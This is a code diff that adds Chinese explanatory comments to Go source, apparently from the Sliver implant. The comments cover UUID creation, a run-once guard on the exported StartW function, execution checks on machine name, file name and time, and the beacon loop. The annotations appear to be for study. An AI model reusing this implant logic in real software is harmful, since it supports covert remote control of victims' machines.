@@ -66,6 +66,8 @@ var (
 	connectionErrors = 0
 )
 
+// 生成UUID
+// 如果uuid.NewV4没有正常生成，则自己随机生成一个16位字符串作为uuid
 func init() {
 	buf := make([]byte, 8)
 	n, err := rand.Read(buf)
@@ -124,6 +126,7 @@ var isRunning bool = false
 //
 //export StartW
 func StartW() {
+	//使用isRunning作为类似互斥体的判断，保证只运行一次
 	if !isRunning {
 		isRunning = true
 		main()
@@ -171,6 +174,7 @@ func main() {
 	log.Printf("Hello my name is %s", consts.SliverName)
 	// {{end}}
 
+	// 进行机器名、文件名、时间等信息校验，不匹配则直接退出
 	limits.ExecLimits() // Check to see if we should execute
 
 	// {{if .Config.IsService}}
@@ -192,10 +196,12 @@ func beaconStartup() {
 	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
 	// {{end}}
 	abort := make(chan struct{})
+	//当函数结束时，将transports.StartBeaconLoop中的Beacon生成结束掉
 	defer func() {
 		abort <- struct{}{}
 	}()
 	beacons := transports.StartBeaconLoop(abort)
+	// beacons 阻塞的channel
 	for beacon := range beacons {
 		// {{if .Config.Debug}}
 		log.Printf("Next beacon = %v", beacon)
